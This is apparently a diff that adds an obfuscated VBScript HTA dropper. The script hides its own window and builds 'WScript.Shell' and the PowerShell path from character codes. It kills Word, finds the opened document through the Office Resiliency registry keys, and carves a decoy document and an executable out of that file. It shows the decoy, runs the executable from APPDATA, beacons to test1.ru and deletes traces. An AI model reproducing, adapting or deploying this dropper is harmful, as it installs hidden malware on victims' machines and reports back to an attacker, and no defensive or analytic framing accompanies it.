@@ -1,0 +1,16 @@
+<script language="VBScript">
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+Dim o,kw,cr1,cr2,ps,d,l,r,wv
+Set	o	=	CReAtEOBJECt(ChrW(&H57) & ChrW(&H73) & Chr(&H43) & ChrW(&H72) & Chr(&H69) & Chr(&H50) & Chr(&H74) & Chr(&H2E) & ChrW(&H53) & Chr(&H48) & Chr(&H65) & Chr(&H4C) & Chr(&H6C))
+wd=o.expAnDenvIRonMEnTStrings(	StrReverse(Chr(&H25)) & StrReverse(Chr(&H73)) & StrReverse(ChrW(&H59)) & ChrW(&H53) & StrReverse(Chr(&H74)) & ChrW(&H65) & StrReverse(ChrW(&H6D)) & Chr(&H52) & StrReverse(Chr(&H4F)) & StrReverse(Chr(&H4F)) & StrReverse(Chr(&H74)) & Chr(&H25)	)
+ps= wd & Chr(&H5C) & StrReverse(ChrW(&H53)) & StrReverse(ChrW(&H59)) & ChrW(&H53) & Chr(&H74) & ChrW(&H65) & Chr(&H4D) & StrReverse(ChrW(&H33)) & StrReverse(ChrW(&H32)) & Chr(&H5C) & StrReverse(Chr(&H77)) & ChrW(&H69) & StrReverse(Chr(&H6E)) & ChrW(&H64) & StrReverse(Chr(&H6F)) & Chr(&H77) & Chr(&H73) & StrReverse(ChrW(&H70)) & StrReverse(ChrW(&H4F)) & StrReverse(Chr(&H77)) & Chr(&H65) & StrReverse(Chr(&H52)) & Chr(&H53) & Chr(&H48) & StrReverse(Chr(&H65)) & StrReverse(ChrW(&H4C)) & ChrW(&H4C) & StrReverse(ChrW(&H5C)) & StrReverse(Chr(&H56)) & StrReverse(Chr(&H31)) & ChrW(&H2E) & Chr(&H30) & ChrW(&H5C) & Chr(&H50) & Chr(&H6F) & ChrW(&H57) & Chr(&H45) & ChrW(&H72) & ChrW(&H53) & Chr(&H48) & ChrW(&H45) & Chr(&H4C) & StrReverse(ChrW(&H4C)) & StrReverse(ChrW(&H2E)) & StrReverse(Chr(&H45)) & StrReverse(Chr(&H78)) & Chr(&H65) & " -WindowStyle Hidden "
+kw = "taskkill /f /im winword.ex" & ChrW(&H65) & ";"
+d=Chr(36)
+l=Chr(91)
+r=Chr(93)
+cr1="ri -Path """"""HKCU:\Software\Microsoft\Office\"
+cr2="\Word\Resiliency"""""" -recurse;"
+o.run ps & "Try{" & d & "ada=""""""" & d & "env:APPDATA\result.exe"""""";" & d & "adax=" & d & "ada+'x';" & d & "f=" & l & "System.IO.File" & r & "::Create(" &d & "adax);" & d & "tmf=""""""" & d & "env:TEMP\o.tmp"""""";" & kw & "Function pr{Try{" & d & "k=""""""HKCU:\Software\Microsoft\Office\" &d & "wv" & "\Word\Resiliency\StartupItems\"""""";" & "for (" & d & "i = 0; " & d & "i -lt 10; " & d & "i++){" & d & "r=" & l & "System.Text.Encoding" & r & "::Unicode.GetString((gp " & d & "k).((gi " & d & "k).Property" & l & d & "i" & r & "));if (" & d & "r.Contains('.doc')){" & d & "i=10;}}"	& d & "r=" & d & "r.Substring(" & d & "r.indexOf(':\')-1);" & d & "r=" & d & "r.Substring(0, " & d & "r.IndexOf('.doc')+4);" & cr1 & d & "wv" & cr2 & "cp -Path "& d &"r -Destination " & d & "tmf" & ";" & d & "d = (gc " & d & "tmf" & " -ReadCount 0 -encoding byte)" & l & "DECOY_START..DECOY_END" & r & ";Start-Sleep -s 1;sc " & d & "r -encoding byte -Value " & d & "d;" & "start winword """"""" & d & "r"""""";" & d & "f = (gc " & d & "tmf" & " -ReadCount 0 -encoding byte)" & l & "EXE_START..EXE_END" & r & ";sc " & d & "ada"  & " -encoding byte -Value " & d & "f;" & "& " & d & "ada;" & d & "wc = New-Object system.Net.WebClient;" & d & "ht=" & d & "wc.d" & "ownl" & "oadS" & "tri" & "ng('http://test1.ru/newbuild/t.php?act=hit');" & d & "cd=(Resolve-Path .\).Path;ri """"""" & d & "cd\*"""""" -include http*.pdb, http*.dll, *.cs;" & "}Catch{}};" & d & "wv='12.0';pr;" & d & "wv='14.0';pr;" & d & "wv='15.0';pr;" & d & "wv='16.0';pr;" & "Stop-Process -processname powershell;}Catch{exit;}",0,true
+self.close
+</script>
